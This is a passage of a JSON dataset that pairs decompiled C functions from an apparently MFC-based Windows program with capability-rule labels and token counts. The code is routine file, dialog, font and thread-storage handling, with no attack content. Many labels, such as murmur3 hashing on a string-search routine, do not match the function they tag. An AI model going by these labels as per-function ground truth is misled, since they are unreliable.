+ 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar2 < uVar4);\n            }\n        }\n        *param_2 = piVar5;\n        fcn.00405f00(piVar3 + 2);\n        *param_3 = piVar3[3];\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "004316dd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004316dd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    if (*(param_1 + 4) != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        bVar3 = iVar1 == 0;\n    }\n    *(param_1 + 4) = 0xffffffff;\n    *(param_1 + 8) = 0;\n    fcn.00401810();\n    if (bVar3) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(*(param_1 + 0xc));\n        fcn.004323b3(uVar2);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00431720": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431720(int32_t param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    \n    if (*(param_1 + 4) != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        *(param_1 + 4) = 0xffffffff;\n    }\n    piVar3 = param_1 + 0xc;\n    iVar5 = *piVar3;\n    ppiVar1 = iVar5 + -0x10;\n    piVar4 = *ppiVar1;\n    if (*(iVar5 + -0xc) != 0) {\n        piVar2 = iVar5 + -4;\n        if (*(iVar5 + -4) < 0) {\n            if (*(iVar5 + -8) < 0) {\n                fcn.00401100(0x80070057);\n                iVar5 = extraout_ECX;\n            }\n            *(iVar5 + -0xc) = 0;\n            **piVar3 = 0;\n            return;\n        }\n        LOCK();\n        iVar5 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1);\n        }\n        iVar5 = (**(*piVar4 + 0xc))();\n        *piVar3 = iVar5 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "00431946": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_15ch\n// WARNING: Variable defined which should be unmapped: lpFindFileData\n// WARNING: Variable defined which should be unmapped: lpFilePart\n// WARNING: Variable defined which should be unmapped: var_158h\n\nvoid __cdecl fcn.00431946(uint lpRootPathName, uint lpFileName)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_15ch;\n    uint var_158h;\n    uint lpFilePart;\n    uint lpFindFileData;\n    uint lpString2;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    uVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = *0x4640c8;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(*(unaff_EBP + 0xc), 0x104, uVar1, unaff_EBP + -0x154);\n    if (uVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, *(unaff_EBP + 0xc), 0x104);\n    }\n    else if (uVar2 < 0x104) {\n        piVar3 = fcn.004290ee();\n        iVar4 = (**(*piVar3 + 0xc))();\n        *(unaff_EBP + 8) = iVar4 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        fcn.00431904(uVar1, unaff_EBP + 8);\n        iVar4 = (*_sym.imp.SHLWAPI.dll_PathIsUNCA)(*(unaff_EBP + 8));\n        if ((iVar4 == 0) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)\n                              (*(unaff_EBP + 8), 0, 0, 0, unaff_EBP + -0x15c, unaff_EBP + -0x158, 0, 0),  iVar4 != 0)) {\n            if ((*(unaff_EBP + -0x158) & 2) == 0) {\n                (*_sym.imp.USER32.dll_CharUpperA)(uVar1);\n            }\n            if (((((*(unaff_EBP + -0x158) & 4) == 0) &&\n                 (iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(*(unaff_EBP + 0xc), unaff_EBP + -0x150),  iVar4 != -1)\n                 ) && ((*_sym.imp.KERNEL32.dll_FindClose)(iVar4),  *(unaff_EBP + -0x154) != 0)) &&\n               ((uVar1 <= *(unaff_EBP + -0x154) && *(unaff_EBP + -0x154) != uVar1 &&\n                (iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(unaff_EBP + -0x124), \n                (iVar4 - uVar1) + *(unaff_EBP + -0x154) < 0x104)))) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(*(unaff_EBP + -0x154), unaff_EBP + -0x124);\n            }\n        }\n        fcn.00401200();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 836
    },
    "00431a87": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431a87(uint lpFileName, uint32_t dwDesiredAccess, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint uVar6;\n    uint lpSecurityAttributes;\n    uint var_110h;\n    uint32_t var_10ch;\n    uint var_108h;\n    uint var_4h;\n    \n    uVar1 = dwDesiredAccess;\n    var_4h = *0x4640c8;\n    *(in_ECX + 8) = 0;\n    *(in_ECX + 4) = 0xffffffff;\n    uVar5 = dwDesiredAccess & 0xffff7fff;\n    fcn.00401810();\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpFileName);\n    if ((0x103 < iVar3) || (iVar3 = fcn.00431946(&var_108h, lpFileName),  iVar3 == 0)) goto code_r0x00431c01;\n    fcn.00401c20(&var_108h);\n    uVar4 = dwDesiredAccess & 3;\n    dwDesiredAccess = 0;\n    if (uVar4 == 0) {\n        dwDesiredAccess = 0x80000000;\n    }\n    else if (uVar4 == 1) {\n        dwDesiredAccess = 0x40000000;\n    }\n    else if (uVar4 == 2) {\n        dwDesiredAccess = 0xc0000000;\n    }\n    uVar4 = uVar1 & 0x70;\n    uVar6 = 1;\n    if ((uVar4 == 0) || (uVar4 == 0x10)) {\ncode_r0x00431b3e:\n        uVar6 = 0;\n    }\n    else if (uVar4 != 0x20) {\n        if (uVar4 == 0x30) {\n            uVar6 = 2;\n        }\n        else {\n            uVar6 = 3;\n            if (uVar4 != 0x40) goto code_r0x00431b3e;\n        }\n    }\n    var_10ch = ~(uVar5 >> 7) & 1;\n    lpSecurityAttributes = 0xc;\n    var_110h = 0;\n    if ((uVar1 & 0x1000) == 0) {\n        cVar2 = '\\x03';\n    }\n    else {\n        cVar2 = (-((uVar1 & 0x2000) != 0) & 2U) + 2;\n    }\n    uVar5 = 0x80;\n    if ((uVar1 & 0x10000) != 0) {\n        uVar5 = 0x20000080;\n    }\n    if ((uVar1 & 0x20000) != 0) {\n        uVar5 = uVar5 | 0x80000000;\n    }\n    if ((uVar1 & 0x40000) != 0) {\n        uVar5 = uVar5 | 0x10000000;\n    }\n    if ((uVar1 & 0x80000) != 0) {\n        uVar5 = uVar5 | 0x8000000;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)\n                      (lpFileName, dwDesiredAccess, uVar6, &lpSecurityAttributes, cVar2, uVar5, 0);\n    if (iVar3 == -1) {\n        if (arg_10h != 0) {\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            *(arg_10h + 0xc) = uVar6;\n            uVar6 = fcn.00432048(uVar6);\n            *(arg_10h + 8) = uVar6;\n            fcn.00401c20(lpFileName);\n        }\n    }\n    else {\n        *(in_ECX + 4) = iVar3;\n        *(in_ECX + 8) = 1;\n    }\ncode_r0x00431c01:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 964
    },
    "0043273c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043273c(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t *puVar4;\n    int32_t in_ECX;\n    uint var_20h;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    fcn.00411850(arg_8h, 0, 0x128);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_8h + 0x22, *(in_ECX + 0xc), 0x104);\n    if (*(in_ECX + 4) == *0x452148) {\ncode_r0x00432843:\n        uVar3 = 1;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileTime)\n                          (*(in_ECX + 4), &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        if (iVar1 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(*(in_ECX + 4), 0);\n            arg_8h[6] = uVar2;\n            arg_8h[7] = 0;\n            if (uVar2 != 0xffffffff) {\n                if (*(*(in_ECX + 0xc) + -0xc) == 0) {\n                    *(arg_8h + 8) = 0;\n                }\n                else {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(*(in_ECX + 0xc));\n                    *(arg_8h + 8) = (iVar1 == -1) - 1U & iVar1;\n                }\n                puVar4 = fcn.0040fb6c(&lpCreationTime, 0xffffffff);\n                *arg_8h = *puVar4;\n                arg_8h[1] = puVar4[1];\n                puVar4 = fcn.0040fb6c(&lpLastAccessTime, 0xffffffff);\n                arg_8h[4] = *puVar4;\n                arg_8h[5] = puVar4[1];\n                puVar4 = fcn.0040fb6c(&lpLastWriteTime, 0xffffffff);\n                arg_8h[2] = *puVar4;\n                arg_8h[3] = puVar4[1];\n                if ((*arg_8h | arg_8h[1]) == 0) {\n                    *arg_8h = *puVar4;\n                    arg_8h[1] = puVar4[1];\n                }\n                if ((arg_8h[4] | arg_8h[5]) == 0) {\n                    arg_8h[4] = arg_8h[2];\n                    arg_8h[5] = arg_8h[3];\n                }\n                goto code_r0x00432843;\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 686
    },
    "004361eb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004361eb(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042b38f();\n    if (iVar1 != -1) {\n        if ((*param_2 != 0) && (*(*param_2 + 4) != 0)) {\n            fcn.004366ce(param_1);\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 111
    },
    "00438754": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00438754(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    piVar1 = fcn.004290ee(extraout_ECX);\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    fcn.00401bb0(*(unaff_EBP + 8));\n    iVar2 = *(unaff_EBP + 0x10);\n    if (iVar2 == -1) {\n        iVar2 = *(unaff_EBP + 8);\n    }\n    uVar3 = fcn.00438732(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), iVar2);\n    fcn.00401200();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 336
    },
    "0043ff1b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0043ff1b(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042b38f();\n    if ((iVar1 != -1) && (iVar1 = (**(*param_1 + 0x158))(param_2, param_3),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_PostMessageA)(param_1[7], 0x362, 0xe001, 0);\n        (**(*param_1 + 0x144))(1);\n        return 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 153
    },
    "00444c67": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444c67(uint arg_8h, int32_t Locale)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint lpLibFileName;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if (Locale == 0x800) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(&Locale, 0x451640);\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 3, &Locale, 4);\n        if (iVar2 == 0) goto code_r0x00444cdc;\n    }\n    uVar1 = fcn.004121c8(&lpLibFileName, 0x112, arg_8h, &Locale);\n    if ((uVar1 != 0xffffffff) && (uVar1 < 0x112)) {\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName);\n    }\ncode_r0x00444cdc:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 246
    },
    "004462ca": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004462ca(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uStack12;\n    \n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *param_1 = iVar3;\n    if (iVar3 == -1) {\n        uStack12 = 0x4650a0;\n        fcn.00411d3b(&stack0xfffffff4, 0x45d154);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    uStack12 = 0x446308;\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n    return param_1;\n}\n",
        "token_count": 259
    },
    "0044662a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044662a(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    \n    arg_8h = param_1[5];\n    while (arg_8h != 0) {\n        iVar1 = *(arg_8h + 4);\n        fcn.00446492(arg_8h, 0);\n        arg_8h = iVar1;\n    }\n    if (*param_1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*param_1);\n    }\n    if (param_1[4] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(param_1[4]);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 229
    },
    "00447c31": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00447c31(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar4 = *0x463e34;\n    if (*0x463e34 == -1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"COMCTL32.DLL\");\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"DllGetVersion\");\n        iVar4 = 0x40000;\n        if (pcVar2 != NULL) {\n            fcn.00411850(&var_14h, 0, 0x14);\n            var_14h = 0x14;\n            iVar3 = (*pcVar2)(&var_14h);\n            if (-1 < iVar3) {\n                iVar4 = CONCAT22(var_10h, var_ch);\n            }\n        }\n    }\n    *0x463e34 = iVar4;\n    return iVar4;\n}\n",
        "token_count": 257
    },
    "00447c9f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00447c9f(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*0x463e38 == -1) {\n        uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n        uVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x48, 0, 0, 0, 400, 0, 0, 0, 2, 0, 0, 0, 0, \"Marlett\");\n        iVar4 = (*_sym.imp.GDI32.dll_CreateFontA)(uVar3);\n        pcVar1 = _sym.imp.GDI32.dll_SelectObject;\n        if (iVar4 != 0) {\n            (*_sym.imp.GDI32.dll_SelectObject)(uVar2, iVar4);\n        }\n        (*_sym.imp.GDI32.dll_GetCharWidthA)(uVar2, 0x36, 0x36, 0x463e38);\n        if (iVar4 != 0) {\n            (*pcVar1)(uVar2, uVar3);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar4);\n        }\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    }\n    return *0x463e38;\n}\n",
        "token_count": 303
    },
    "00410119": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t * __cdecl\nfcn.00410119(int32_t *arg_8h, uint lpString, uint chCount, uint nTabPositions, uint lpnTabStopPositions)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetTabbedTextExtentA)\n                      (*(in_ECX + 8), lpString, chCount, nTabPositions, lpnTabStopPositions);\n    arg_8h[1] = uVar1 >> 0x10;\n    *arg_8h = uVar1;\n    return arg_8h;\n}\n",
        "token_count": 139
    },
    "00417940": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t * fcn.00417940(uint32_t *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    \n    cVar3 = *param_2;\n    if (cVar3 == '\\0') {\n        return param_1;\n    }\n    if (param_2[1] == '\\0') {\n        uVar4 = param_1 & 3;\n        while (uVar4 != 0) {\n            if (*param_1 == cVar3) {\n                return param_1;\n            }\n            if (*param_1 == '\\0') {\n                return NULL;\n            }\n            uVar4 = param_1 + 1 & 3;\n            param_1 = param_1 + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar4 = *param_1;\n                uVar9 = uVar4 ^ CONCAT22(CONCAT11(cVar3, cVar3), CONCAT11(cVar3, cVar3));\n                uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;\n                puVar10 = param_1 + 1;\n                if (((uVar9 ^ 0xffffffff ^ uVar9 + 0x7efefeff) & 0x81010100) != 0) break;\n                param_1 = puVar10;\n                if ((uVar7 & 0x81010100) != 0) {\n                    if ((uVar7 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar4 = *param_1;\n            if (uVar4 == cVar3) {\n                return param_1;\n            }\n            if (uVar4 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 8;\n            if (cVar6 == cVar3) {\n                return param_1 + 1;\n            }\n            if (cVar6 == '\\0') break;\n            cVar6 = uVar4 >> 0x10;\n            if (cVar6 == cVar3) {\n                return param_1 + 2;\n            }\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 0x18;\n            if (cVar6 == cVar3) {\n                return param_1 + 3;\n            }\n            param_1 = puVar10;\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    do {\n        cVar6 = *param_1;\n        do {\n            while (puVar10 = param_1,  param_1 = puVar10 + 1,  cVar6 != cVar3) {\n                if (cVar6 == '\\0') {\n                    return NULL;\n                }\n                cVar6 = *param_1;\n            }\n            cVar6 = *param_1;\n            pcVar8 = param_2;\n            puVar5 = puVar10;\n        } while (cVar6 != param_2[1]);\n        do {\n            if (pcVar8[2] == '\\0') {\n                return puVar10;\n            }\n            if (*(puVar5 + 2) != pcVar8[2]) break;\n            pcVar1 = pcVar8 + 3;\n            if (*pcVar1 == '\\0') {\n                return puVar10;\n            }\n            pcVar2 = puVar5 + 3;\n            pcVar8 = pcVar8 + 2;\n            puVar5 = puVar5 + 2;\n        } while (*pcVar1 == *pcVar2);\n    } while( true );\n}\n",
        "token_count": 922
    },
    "0041f218": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f218(char *arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_10h;\n    var_4h = *0x4640c8;\n    iVar1 = 0x404e;\n    *arg_10h = 0;\n    arg_10h[1] = 0;\n    arg_10h[2] = 0;\n    if (arg_ch != 0) {\n        arg_10h = arg_ch;\n        do {\n            var_10h = *puVar2;\n            var_ch = puVar2[1];\n            var_8h = puVar2[2];\n            fcn.0041f1bd(puVar2);\n            fcn.0041f1bd(puVar2);\n            fcn.0041f15f(puVar2, &var_10h);\n            fcn.0041f1bd(puVar2);\n            var_10h = *arg_8h;\n            var_ch = 0;\n            var_8h = 0;\n            fcn.0041f15f(puVar2, &var_10h);\n            arg_8h = arg_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != NULL);\n    }\n    if (puVar2[2] == 0) {\n        do {\n            iVar1 = iVar1 + -0x10;\n            uVar3 = puVar2[1] >> 0x10;\n            puVar2[1] = *puVar2 >> 0x10 | puVar2[1] << 0x10;\n            *puVar2 = *puVar2 << 0x10;\n        } while (uVar3 == 0);\n        puVar2[2] = uVar3;\n    }\n    while ((puVar2[2] & 0x8000) == 0) {\n        fcn.0041f1bd(puVar2);\n        iVar1 = iVar1 + -1;\n    }\n    *(puVar2 + 10) = iVar1;\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 562
    },
    "004238ea": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004238ea(int32_t arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    \n    if (arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        iVar3 = fcn.00446580(0x443d27);\n        if ((*(iVar3 + 0x18) != 0) && (iVar4 = fcn.0042b459(arg_8h),  iVar4 == 0)) {\n            fcn.0042c34a(arg_8h);\n            *(iVar3 + 0x18) = 0;\n        }\n        pcVar1 = _sym.imp.USER32.dll_RegisterWindowMessageA;\n        if (arg_ch == 0x110) {\n            *0x467048 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(\"commdlg_LBSelChangedNotify\");\n            *0x46704c = (*pcVar1)(\"commdlg_ShareViolation\");\n            *0x467050 = (*pcVar1)(\"commdlg_FileNameOK\");\n            *0x467054 = (*pcVar1)(\"commdlg_ColorOK\");\n            *0x467058 = (*pcVar1)(\"commdlg_help\");\n            *0x46705c = (*pcVar1)(\"commdlg_SetRGBColor\");\n            uVar2 = fcn.004283b1(arg_8h, 0x110, arg_10h, arg_14h);\n        }\n        else if ((arg_ch == *0x467058) || ((arg_ch == 0x111 && (arg_10h == 0x40e)))) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x111, 0xe146, 0);\n            uVar2 = 1;\n        }\n        else {\n            if (0xbfff < arg_ch) {\n                piVar5 = fcn.0042b459(arg_8h);\n                iVar3 = fcn.0042ffa1(0x4529b4);\n                if ((iVar3 == 0) || (iVar3 = fcn.00422e7f(),  (*(iVar3 + 0x36) & 8) == 0)) {\n                    if (arg_ch == *0x46704c) {\n                        uVar2 = (**(*piVar5 + 0x158))(arg_14h);\n                        return uVar2;\n                    }\n                    if (arg_ch == *0x467050) {\n                        piVar5[0x70] = arg_14h;\n                        uVar2 = (**(*piVar5 + 0x15c))();\n                        piVar5[0x70] = 0;\n                        return uVar2;\n                    }\n                    if (arg_ch == *0x467048) {\n                        (**(*piVar5 + 0x160))(arg_10h, arg_14h & 0xffff, arg_14h >> 0x10);\n                    }\n                    else if (arg_ch == *0x467054) {\n                        uVar2 = (**(*piVar5 + 0x158))();\n                        return uVar2;\n                    }\n                }\n            }\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 764
    },
    "0042b35a": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.0042b35a(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00446580(0x443d27);\n    uVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar1 + 0x68) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar1 + 0x70) = uVar2 >> 0x10;\n    *(iVar1 + 0x6c) = uVar2;\n    return iVar1 + 0x58;\n}\n",
        "token_count": 140
    },
    "0042c552": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042c552(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == 0) {\n        if (uVar3 == 0) {\n            return 0;\n        }\n        fcn.00429c3e();\n        var_28h = uVar3;\n        (**(*in_ECX + 0xc))(uVar3, 0xffffffff, &var_2ch, 0);\n        if (var_4h != 0) {\n            arg_8h = 0;\ncode_r0x0042c596:\n            uVar1 = (**(*in_ECX + 0xc))(uVar3, arg_8h, 0, 0);\n            return uVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.00446580(0x443d27);\n        if ((*(iVar2 + 0xdc) != in_ECX[7]) && (iVar2 = fcn.0042bfd9(arg_ch, 0),  iVar2 == 0)) {\n            if (uVar3 == 0) {\n                return 0;\n            }\n            goto code_r0x0042c596;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 361
    },
    "0042fff8": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042fff8(uint lpString2, uint nNumber, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t lptm;\n    int32_t var_78h;\n    int32_t var_50h;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_30h;\n    uint var_29h;\n    uint lpString1;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n    fcn.00411850(&var_40h, 0, 0x3c);\n    uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a, 0x48);\n    var_40h = (*_sym.imp.KERNEL32.dll_MulDiv)(nNumber, uVar4);\n    var_40h = -var_40h;\n    var_30h = 400;\n    var_29h._0_1_ = 1;\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(&lpString1, lpString2, 0x20);\n    var_44h = 